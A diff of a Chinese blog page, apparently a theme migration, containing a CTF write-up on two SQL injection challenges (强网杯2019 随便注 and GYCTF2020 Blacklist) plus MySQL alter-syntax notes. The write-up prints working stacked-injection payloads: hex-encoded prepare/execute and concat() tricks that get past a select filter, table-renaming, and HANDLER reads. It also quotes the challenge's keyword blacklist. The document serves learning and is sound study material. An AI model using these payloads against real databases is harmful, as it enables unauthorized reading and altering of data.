@@ -1,290 +1,181 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>随便注|blacklist =&gt; 的一些知识 | Na0H的神光棒存放地</title><meta name="keywords" content="学习笔记"><meta name="author" content="Na0H_1e3"><meta name="copyright" content="Na0H_1e3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="由堆叠注入对sql语句的一些学习（alert、handle、预处理）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="随便注|blacklist &#x3D;&gt; 的一些知识">
+<meta property="og:url" content="http://na0hblog.top/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/index.html">
+<meta property="og:site_name" content="Na0H的神光棒存放地">
+<meta property="og:description" content="由堆叠注入对sql语句的一些学习（alert、handle、预处理）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://na0hblog.top/img/atimg/12.jpg">
+<meta property="article:published_time" content="2021-03-09T09:33:28.000Z">
+<meta property="article:modified_time" content="2021-04-30T17:16:15.220Z">
+<meta property="article:author" content="Na0H_1e3">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://na0hblog.top/img/atimg/12.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://na0hblog.top/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "6hnvvhr9lc");</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '随便注|blacklist => 的一些知识',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-01 01:16:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;light&#34;>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="Na0H_1e3">
-  <meta name="keywords" content="Na0H1e3,blog,博客,web,ctf,渗透">
-  <title>随便注|blacklist =&gt; 的一些知识 - Na0H的神光棒存放地</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"na0hblog.top","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"🐳_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-MLL1PZ9RBK","gtag":260676474,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz","app_key":"y4AXlgIqQsV7Enr3IFS3r6Ck","server_url":"https://zjcv2ot3.lc-cn-n1-shared.com"}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.3.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Na0H的神光棒存放地</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/textbg.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="随便注|blacklist => 的一些知识">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-09 17:33" pubdate>
-        2021年3月9日 下午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.4k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      19
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- LeanCloud 统计文章PV -->
-      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="leancloud-page-views"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">随便注|blacklist =&gt; 的一些知识</h1>
-            
-              <p class="note note-info">
-                
-                  本文最后更新于：2021年3月12日 晚上
-                
-              </p>
-            
-            <div class="markdown-body">
-              <!-- more -->
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/atimg/12.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Na0H的神光棒存放地</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">随便注|blacklist =&gt; 的一些知识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-09T09:33:28.000Z" title="发表于 2021-03-09 17:33:28">2021-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-30T17:16:15.220Z" title="更新于 2021-05-01 01:16:15">2021-05-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><!-- more -->
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近刷题刷到 [强网杯2019]随便注 和 [GYCTF2020]Blacklist；<br>加深了一点对堆叠注入的理解，也了解到一些相关waf的简单bypass<br>算是对之前sqli学习的一些补充吧；后续也要对mysql进行深入的学习才行（毕竟这学期也有这门课程–）</p>
-<h1 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h1><p><img src="https://i.loli.net/2021/03/09/753fzuyAcqHebMO.png" srcset="/img/loading.gif"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">堆叠注入：<br>1&#39;; show databases;#	&#x2F;&#x2F;库名<br>1&#39;; show tables;#		&#x2F;&#x2F;表名<br>1&#39;; show columns from &#96;1919810931114514&#96;;# 	&#x2F;&#x2F;字段；表名为数字时，要用反引号包起来查询。<br></code></pre></td></tr></table></figure>
+<h1 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h1><p><img src="https://i.loli.net/2021/03/09/753fzuyAcqHebMO.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入：</span><br><span class="line">1&#39;; show databases;#	&#x2F;&#x2F;库名</span><br><span class="line">1&#39;; show tables;#		&#x2F;&#x2F;表名</span><br><span class="line">1&#39;; show columns from &#96;1919810931114514&#96;;# 	&#x2F;&#x2F;字段；表名为数字时，要用反引号包起来查询。</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>预处理</p>
 <p>select被过滤了，所以先将</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from &#96; 1919810931114514 &#96;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96; 1919810931114514 &#96;</span><br></pre></td></tr></table></figure>
 <p>进行16进制编码</p>
 <p>再通过构造payload进而得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x2F;&#x2F;1:利用预处理语句会进行编码转换，将sql语句转为十六进制<br>-1&#39;;<br>SeT @a &#x3D; 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;	<br>prepare execsql from @a;			<br>execute execsql;			<br><br># set：设置变量名和值<br># prepare…from…：预处理语句，会进行编码转换；且prepare用于预备一个语句，并赋予名称，之后可以引用该语句<br># execute：执行由SQLPrepare创建的SQL语句<br># ps：SELECT 可以在一条语句里对多个变量同时赋值,而 SET 只能一次对一个变量赋值<br><br>&#x2F;&#x2F;2：利用concat()也可以0-0<br>-1&#39;;<br>Set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);<br>prepare execsql from @a;<br>execute execsql;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1:利用预处理语句会进行编码转换，将sql语句转为十六进制</span><br><span class="line">-1&#39;;</span><br><span class="line">SeT @a &#x3D; 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;	</span><br><span class="line">prepare execsql from @a;			</span><br><span class="line">execute execsql;			</span><br><span class="line"></span><br><span class="line"># set：设置变量名和值</span><br><span class="line"># prepare…from…：预处理语句，会进行编码转换；且prepare用于预备一个语句，并赋予名称，之后可以引用该语句</span><br><span class="line"># execute：执行由SQLPrepare创建的SQL语句</span><br><span class="line"># ps：SELECT 可以在一条语句里对多个变量同时赋值,而 SET 只能一次对一个变量赋值</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2：利用concat()也可以0-0</span><br><span class="line">-1&#39;;</span><br><span class="line">Set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare execsql from @a;</span><br><span class="line">execute execsql;</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>修改表名列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#39;;<br>rename table words to word1;								# words 表更名为 word1<br>rename table  &#96;1919810931114514&#96; to words; 					# 1919810931114514 更名为 words <br>alert table words add id int unsigned not Null auto_increment primary key; # 给新 words 表添加新的列名 id<br>alert table words change flag data varchar(100); #			# 将新word中的 flag 改名为 data <br><br><br>#or：<br><br>1&#39;;<br>alter table words rename to words1;							# words 表更名为 word1<br>alter table &#96;1919810931114514&#96; rename to words;				# 1919810931114514 更名为 words<br>alter table words change flag id varchar(50);#				# 将新words 中的 flag 改名为 id<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">rename table words to word1;								# words 表更名为 word1</span><br><span class="line">rename table  &#96;1919810931114514&#96; to words; 					# 1919810931114514 更名为 words </span><br><span class="line">alert table words add id int unsigned not Null auto_increment primary key; # 给新 words 表添加新的列名 id</span><br><span class="line">alert table words change flag data varchar(100); #			# 将新word中的 flag 改名为 data </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#or：</span><br><span class="line"></span><br><span class="line">1&#39;;</span><br><span class="line">alter table words rename to words1;							# words 表更名为 word1</span><br><span class="line">alter table &#96;1919810931114514&#96; rename to words;				# 1919810931114514 更名为 words</span><br><span class="line">alter table words change flag id varchar(50);#				# 将新words 中的 flag 改名为 id</span><br></pre></td></tr></table></figure>
 <p>然后输入<code>1&#39; or 1=1#</code>即可查看flag</p>
 <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>基于随便注改的sql注入；打算联合查询的时候直接爆出了题目说的blacklist黑名单：</p>
 <p><code>(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</code></p>
 <p>猜测后端语句为<code>select * from Table where inject = &#39;$inject&#39;;</code></p>
 <p>爆字段数：<code>1&#39; order by 2--+</code></p>
 <p>ban了select；不能直接联合查詢<br>ban了set和prepare；不能預编译<br>ban了alter和rename；不能改表名访问数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?inject&#x3D;1&#39; ;show tables--+&#96;						#爆表<br>?inject&#x3D;1&#39; ;show columns from &#96;FlagHere&#96;--+		#爆列<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39; ;show tables--+&#96;						#爆表</span><br><span class="line">?inject&#x3D;1&#39; ;show columns from &#96;FlagHere&#96;--+		#爆列</span><br></pre></td></tr></table></figure>
 <h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><p>利用handle方法读取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#39;;<br>handler &#96;FlagHere&#96; open as &#96;a&#96;;<br>handler &#96;a&#96; read next;#<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;FlagHere&#96; open as &#96;a&#96;;</span><br><span class="line">handler &#96;a&#96; read next;#</span><br></pre></td></tr></table></figure>
 <p>or</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#39;;<br>HANDLER FlagHere OPEN;<br>HANDLER FlagHere READ FIRST;<br>HANDLER FlagHere CLOSE;#<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">HANDLER FlagHere OPEN;</span><br><span class="line">HANDLER FlagHere READ FIRST;</span><br><span class="line">HANDLER FlagHere CLOSE;#</span><br></pre></td></tr></table></figure>
 
 
 <p>这的解法同样适用于随便注：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#39;; handler &#96;1919810931114514&#96; open as &#96;a&#96;; handler &#96;a&#96; read next;#<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; handler &#96;1919810931114514&#96; open as &#96;a&#96;; handler &#96;a&#96; read next;#</span><br></pre></td></tr></table></figure>
 
 
 
@@ -293,55 +184,55 @@
 
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>随便注中所说<code>安全与开发缺一不可</code>，结合wp堆叠注入的利用确实发人深省；<br>堆叠注入本就是以分号闭合前面语句，后面的命令全靠自己对sql的命令了解程度。<br>wp中的三种解法都是需要对sql语句有一定了解才整的出的~</p>
 <p>终究是重在积累，要搭好地基啊</p>
-<p><img src="https://i.loli.net/2021/03/09/UmXv1rDdRlbOk8T.png" srcset="/img/loading.gif" alt="先随便建个库和表"></p>
+<p><img src="https://i.loli.net/2021/03/09/UmXv1rDdRlbOk8T.png" alt="先随便建个库和表"></p>
 <h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>alter：修改已知表的列（ 添加：add | 修改：modify，change | 删除：drop）</p>
 <ul>
 <li>添加列</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table &quot;table_name&quot; add &quot;column_name&quot; type [first|after &quot;column_name&quot;];<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/09/NsIdApcy2Ji8LKl.png" srcset="/img/loading.gif"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; add &quot;column_name&quot; type [first|after &quot;column_name&quot;];</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/09/NsIdApcy2Ji8LKl.png"></p>
 <ul>
 <li>删除列</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table &quot;table_name&quot; drop &quot;column_name&quot;;<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/09/ChgRjNpH8X6icv1.png" srcset="/img/loading.gif"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table &quot;table_name&quot; drop &quot;column_name&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/09/ChgRjNpH8X6icv1.png"></p>
 <ul>
 <li>改表名</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table &quot;table_name1&quot; rename to &quot;table_name2&quot;;<br></code></pre></td></tr></table></figure>
